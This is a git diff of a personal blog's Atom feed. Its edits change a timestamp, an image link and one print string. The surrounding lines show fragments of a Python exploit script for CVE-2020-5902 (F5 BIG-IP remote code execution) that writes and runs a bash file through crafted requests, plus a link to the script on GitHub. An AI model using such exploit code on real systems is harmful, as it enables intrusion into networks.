@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com</id>
     <title>斯文beast | 世界很大，你我很小</title>
-    <updated>2020-07-06T09:04:51.835Z</updated>
+    <updated>2020-07-06T09:13:27.640Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -109,7 +109,7 @@ Cookie: JSESSIONID=07E7975B5F6F4B43F3375AA5FFB32628
 <li>编写一个exp脚本以便以后碰到后节省时间</li>
 <li>Github: https://github.com/sv3nbeast/CVE-2020-5902_RCE</li>
 </ul>
-<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com/post-images/1594017831208.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com/post-images/1594026785249.png" alt="" loading="lazy"></figure>
 <pre><code>import requests   #by 斯文
 import sys
 import json
@@ -142,7 +142,7 @@ def check(url, cmd):
         y = requests.get(creat_alias,headers=headers,verify=False,timeout=30)
         print('[+ 正在写入bash文件')
         z = requests.get(write_bash,headers=headers,verify=False,timeout=30)
-        print('[+ 正在执行命令,请查看output字段值')
+        print('[+ 正在执行命令,请查看output字段值'+'\n')
         g = requests.get(exec_bash,headers=headers,verify=False,timeout=30)
         requests.get(del_alias,headers=headers,verify=False,timeout=30)
         text = g.content.decode('utf-8')
